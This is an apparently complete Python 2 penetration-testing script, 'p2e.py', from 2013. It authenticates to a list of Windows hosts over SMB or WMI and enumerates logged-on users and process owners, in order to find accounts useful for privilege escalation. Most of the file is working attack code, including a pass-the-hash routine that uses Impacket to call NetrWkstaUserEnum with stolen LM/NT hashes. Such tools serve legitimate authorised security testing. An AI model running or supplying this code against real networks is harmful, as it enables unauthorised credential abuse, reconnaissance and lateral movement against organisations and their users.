# Josh Berry
# CodeWatch
# December 2013
# 
# License: Do whatever you want with this script
# 
# Reference this for how this was done natively in WMI instead of using the WMI module:
# http://stackoverflow.com/questions/5078570/how-to-set-process-priority-using-pywin32-and-wmi/12631794#12631794
#
# The WMI module was on average 30 seconds slower per host than doing it this way
#
# Reference this for the idea in general:
# http://timgolden.me.uk/python/wmi/cookbook.html
#
# Grabbing the account domain and password can be done with the WMI module like so:
# account = str(process.GetOwner()[0])+'\\'+str(process.GetOwner()[2])
#
# If the password has symbols, you might want to put quotes around it
#
# If you want to use DOMAIN\username, put quotes around it
#
# Pass a hash using --type smb along with the hash in the --pass option
# Additional references:
# - http://corelabs.coresecurity.com/index.php?module=Wiki&action=view&type=tool&name=Impacket
# - http://www.securiteam.com/exploits/6I00W0AHPW.html
# - http://www.hsc.fr/ressources/articles/win_net_srv/well_known_named_pipes.html
# - http://msdn.microsoft.com/en-us/library/aa370669%28VS.85%29.aspx
# - http://docs.activestate.com/activepython/2.5/pywin32/html/win32/help/win32net.html
# - http://docs.activestate.com/activepython/2.5/pywin32/win32security__LogonUser_meth.html
# - http://timgolden.me.uk/python/win32_how_do_i/check-a-users-credentials.html
# - http://timgolden.me.uk/pywin32-docs/html/win32/help/win32net.html

import win32com.client
import argparse
import win32security
import win32net
import win32netcon
import re
import string
from impacket.structure import Structure
from impacket.nmb import NetBIOSTimeout
from impacket.dcerpc import transport
from impacket import uuid
from struct import pack

# Get arguments to run the script
parser = argparse.ArgumentParser(prog='p2e.py', 
	formatter_class=argparse.ArgumentDefaultsHelpFormatter,
	description='Find running process that can be used to escalate access.',
	epilog='Example: p2e.py --iplist iplist.txt --user test --pass testpass --domain testdomain --type smb')
parser.add_argument('--iplist', 
	required=True,
	help='file list of IPs that we can login with using provided username and password')
parser.add_argument('--user', 
	required=True,
	help='the username to use for authentication')
parser.add_argument('--pass', 
	required=True,
	help='the password to use for authentication')
parser.add_argument('--domain', 
	default='',
	help='the Domain to use for authentication')
parser.add_argument('--type', 
	required=True,
	default='smb',
	help='which type of connection to we use, WMI or SMB')
parser.set_defaults(domain='', type='smb')

# Function for use in PtH attack
def utf16(str):
  return str.encode('utf_16_le')

# Class for use in PtH attack
class B1(Structure):
  alignment = 4
  structure = (
    ('id', '<L=0x41414141'),
    ('max', '<L'),
    ('offset', '<L=0'),
    ('actual', '<L'),
    ('str', '%s'),
  )

# Class for use in PtH attack
class NetrWkstaUserEnum(Structure):
  alignment = 4
  opnum = 2
  structure = (
    ('server', ':', B1),
    ('info_level1', '<L=1'),
    ('info_level2', '<L=1'),
    ('referent_id1', '<L=0x42424242'),
    ('num_entries', '<L=0'),
    ('null_pointer', '<L=0'),
    ('max_len', '<L'),
    ('referent_id2', '<L=0x43434343'),
    ('enumeration_handle', '<L=0x00000000'),
  )

# Stick arguments in variable
args = vars(parser.parse_args())

# Load file containing IP list
ips = open(args['iplist'])

# Variable to store unique users in
uniqUsers = dict()

# Function for performing pass the hash
# This function relies on the Core Impacket library
def pth(server):
  # Split the hash
  lmhash, nthash = args['pass'].split(':')

  # Setup memory, pipe, and MSRPC bindings for DCE RPC connection
  memory_size = 1024 * 1024
  pipe = 'wkssvc'
  UUID = ('6bffd098-a112-3610-9833-46c3f87e345a ', '1.0')
  port = '445'
  stringbinding = "ncacn_np:%(server)s[\\pipe\\%(pipe)s]"
  stringbinding %= {'server':server, 'pipe':pipe}
  query = NetrWkstaUserEnum()
  host = "%s\x00" % (server)
  query['server'] = B1()
  query['server']['id'] = 0x41414141
  query['server']['actual'] = len(host)
  query['server']['max'] = len(host)
  query['server']['str'] = utf16(host)
  query['max_len'] = memory_size

  # Create the DCE RPC connection, pass in credentials
  trans = transport.DCERPCTransportFactory(stringbinding)
  trans.set_dport(port)
  trans.set_credentials(args['user'], '', args['domain'], lmhash, nthash)

  # Attempt to make a connection, if not then it failed and move on
  try:
    # Establish DCE RPC connection
    trans.connect()
    dce = trans.DCERPC_class(trans) 

    # Bind or fail
    try:
      # Bind the the correct \\wkssvc UUDI
      dce.bind(uuid.uuidtup_to_bin((UUID[0], UUID[1])))
    except:
      print '[*] SMB connection to '+server+' failed'

    # Make the query to NetrWkstaUserEnum on the target to get unique users or fail
    try:
      dce.call(query.opnum, query)

      # If the query suceeded, receive data or fail
      try:
        raw = dce.recv()
        status = raw[-4:]

        # Check for a successful status, if so continue to grab users
        if(status == pack("<L", 0x00000000)):
          # Perform a bunch of encoding/decoding to remove junk I don't want
          # Couldn't find any good references on packet structure, so this is ugly
          # Converting to hex, replacing non-printable characters with chars like ; and \ that can be parsed
          rawData = raw.decode('utf-8', 'ignore')
          hexData = u''.join(rawData).encode('hex').strip()
          stripData = re.sub('0000000000060000000000000006000000', '5c', hexData)
          stripData = re.sub('00000001000000000000000100000000000000080000000000000008000000', '3b', stripData)
          stripData = re.sub('0000000[a-efA-F0-9]000000000000000[a-fA-F0-9]000000', '3b', stripData)
          stripData = re.sub('0200070000000000000007000000', '3b', stripData)
          stripData = re.sub('000000100000000000000010000000', '3b', stripData)
          cleanData = ''.join(filter(lambda x: x in string.printable, stripData.strip().decode('hex')))

          # Split on the characters that were replaced with ;
          pairs = cleanData.split(';')
          pair = 0

          # For each pair, add the unique user to the dict
          for i in pairs:
            if pair > 0:
              if re.search('\\\\', i):
                cred = i.split('\\')
                uniqUsers[cred[1]+'\\'+cred[0]] = cred[1]+'\\'+cred[0]
            pair += 1
      except:
        print '[*] SMB connection to '+server+' failed'
    except:
      print '[*] SMB connection to '+server+' failed' 
  except:
    print '[*] SMB connection to '+server+' failed'

# Function to use standard SMB libraries with username + password
def smbUsers(server):
  fixDomain = ''
  
  # If the domain is set, use it else use . which is basically an empty domain
  if re.search('^[a-zA-Z0-9]', args['domain']):
    fixDomain = args['domain']
  else:
    fixDomain = '.'

  # Impersonate the user passed as the --user --pass credentials
  handle = win32security.LogonUser(
    args['user'], 
    fixDomain, 
    args['pass'], 
    win32security.LOGON32_LOGON_NEW_CREDENTIALS, 
    win32security.LOGON32_PROVIDER_DEFAULT
  )

  # Complete impersonation
  win32security.ImpersonateLoggedOnUser(handle)

  # Try to make an SMB connection, else fail
  try:
    resume=1
    pref=win32netcon.MAX_PREFERRED_LENGTH
    level=1

    # Loop through each response in the connection and get users
    while resume:
      (userList,total,endhandle)=win32net.NetWkstaUserEnum(server,level,resume,pref)
      # Loop through each user provided and add to uniqUsers dict
      for i in userList:
        account = i['logon_domain']+'\\'+i['username']
        uniqUsers[account] = account
      resume=endhandle
  except:
    print '[*] SMB connection to '+server+' failed'

# Function to make a WMI connection to get unique users
def wmiUsers(server):
  # Attempt to make a WMI connection
  try:
    wmiUser = args['user']

    # If domain option was passed (--domain) use it as part of the account
    if re.search('^[a-zA-Z0-9]', args['domain']):
      wmiUser = args['domain']+'\\'+args['user']

    # Setup WMI and connect using provided IP, username, and password,
    # then search for running processes
    loc = win32com.client.Dispatch('WbemScripting.SWbemLocator') 
    conn = loc.ConnectServer(server, 'root\\cimv2', wmiUser, args['pass'])
    processes = conn.InstancesOf('Win32_Process')

    # Loop through each identified process
    for process in processes:
      # Get owner information for each process
      disp = win32com.client.Dispatch(process)
      meth = disp.Methods_('GetOwner')
      methVals = disp.ExecMethod_(meth.Name)

      # Build a variable containing the WORKGROUP or DOMAIN + the User account
      account = str(methVals.Properties_('Domain').Value)+'\\'+str(methVals.Properties_('User').Value)

      # If owner information was not null/NONE, then add to dict
      if re.search('None', account) is None:
        uniqUsers[account] = account
  except:
    print '[*] WMI connection to '+server+' failed'

# If the correct type wasn't set then bail
if re.search('^(smb|wmi)$', args['type'], re.IGNORECASE) is None:
  print 'Invalid or unspecified protocol type in --type'
  exit(1)
else:
  print '[*] Starting scan using '+args['type']

  # Loop through each IP listed in file passed with --iplist option
  for ip in ips.readlines():
    ip = ip.strip('\n')
    print '[*] Attempting to connect to '+args['type']+' on '+ip

    # If the type was SMB, pick one of the SMB functions to use, else use WMI
    if re.search('^smb$', args['type'], re.IGNORECASE):
      # If the password matches the lm/nt hash format, use PtH
      if re.match('[a-zA-Z0-9]{32}:[a-zA-Z0-9]{32}', args['pass']):
        print '[*] Passing the hash attack on '+ip
        pth(ip)
      else:
        smbUsers(ip)
    else:
      wmiUsers(ip)
    
    # Loop through unique users dict
    print '[+] Unique users for '+ip
    for u in uniqUsers:
      print '\t[-] User: '+u

    # Reset uniqUsers dict after each IP
    del uniqUsers
    uniqUsers = dict()